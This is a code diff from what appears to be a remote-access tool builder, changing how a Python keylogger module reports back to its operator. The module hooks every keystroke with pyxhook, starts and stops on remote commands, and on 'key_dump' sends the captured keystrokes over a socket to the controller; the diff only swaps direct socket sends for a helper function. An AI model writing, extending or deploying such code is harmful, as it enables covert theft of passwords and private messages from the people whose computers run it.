@@ -38,14 +38,14 @@ def key(option):
     global keylog
     if option == 'key_start':
         if active_logger:
-            s.sendall('[-]Keylogger already started'.encode())
+            main_send('[-]Keylogger already started', s)
         else:
             hooks_manager = pyxhook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
             hooks_manager.start()
             active_logger = not active_logger
-            s.sendall('[+]Activated keylogger'.encode())
+            main_send('[+]Activated keylogger', s)
             while True:
                 if not active_logger:
                     hooks_manager.cancel()
@@ -54,12 +54,12 @@ def key(option):
                     sleep(1)
     elif option == 'key_stop':
         if not active_logger:
-            s.sendall('[-]Keylogger not started'.encode())
+            main_send('[-]Keylogger not started', s)
         else:
             active_logger = not active_logger
-            s.sendall('[+]Stopped keylogger'.encode())
+            main_send('[+]Stopped keylogger', s)
     elif option == 'key_dump':
-        s.sendall(('[+]Keylog dump : \\n' + keylog + '\\n').encode())
+        main_send('[+]Keylog dump : \\n' + keylog + '\\n', s)
         keylog = ""''')
         config.logics.append('''
             elif command in ('key_start','key_stop','key_dump'):
